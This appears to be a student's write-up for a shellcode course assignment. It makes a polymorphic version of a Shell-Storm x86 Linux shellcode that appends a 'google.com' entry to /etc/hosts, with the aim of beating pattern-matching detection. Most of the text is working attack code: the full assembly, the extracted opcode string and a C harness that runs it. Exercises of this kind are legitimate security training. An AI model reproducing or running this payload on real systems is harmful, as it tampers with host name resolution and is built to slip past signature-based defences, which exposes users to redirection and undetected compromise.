### Assignment Six:

1. Take up 3 shellcodes from Shell--Storm and create polymorphic versions of them to beat pattern matching
2. The polymorphic versions cannot be larger 150% of the existing shellcode
3. Bonus points for making it shorter in length than original

### Linux/x86 - Add map in /etc/hosts file - 77 bytes
http://shell-storm.org/shellcode/files/shellcode-893.php

After inspected the shellcode, I thought to myself, why don't I just use another jmp call pop to the address storing /etc/hosts to ebx? As such, I created this polymorphic version of shellcode which have the same length as the original one. Notice that I put the new _load_name: under _load_data: instead is because put the new function above cannot terminate the file name properly. Causing the systemcall not able to open the file. Another point to notice is that do not include any word that has the word "file" in it. It seems that the objdump bash code that help us to extract shellcode will trim away any code with this word in it. This actually cause my shellcode fail to execute when I convert it to the c program. So, lesson learnt, know what you tools really do is very important.

Below is the polymorphic version of my shellcode
```
global _start

section .text

_start:
	xor ecx, ecx
	mul ecx
	mov al, 0x5
	push ecx
	;push 0x7374736f	    ;/etc///hosts
	;push 0x682f2f2f
	;push 0x6374652f
	jmp short _load_name	;We will use another jmp call pop to replace it instead

_open:
	;mov ebx, esp
	pop ebx	
	mov cx, 0x401		    ;permmisions
	int 0x80		        ;syscall to open file

	xchg eax, ebx
	push 0x4
	pop eax
	jmp short _load_data	;jmp-call-pop technique to load the map

_write:
	pop ecx
	;push 20		;length of the string, dont forget to modify if changes the map
	;pop edx
	mov dl, 20		;edx remain 0x0 at this point
	int 0x80		;syscall to write in the file

	push 0x6
	pop eax
	int 0x80		;syscall to close the file

	push 0x1
	pop eax
	int 0x80		;syscall to exit

_load_data:
	call _write
	google db "127.1.1.1 google.com"

_load_name:			;Original named _load_file, which cause the objdump bash strip away the opcode
	call _open
	hosts db "/etc/hosts"
```

```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc9\xf7\xe1\xb0\x05\x51\xeb\x35\x5b\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x0f\x59\xb2\x14\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xec\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\xe8\xc6\xff\xff\xff\x2f\x65\x74\x63\x2f\x68\x6f\x73\x74\x73";

int main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
```

The length of the shellcode is the same as original. After we execute it, a new entry was added to the hosts file.
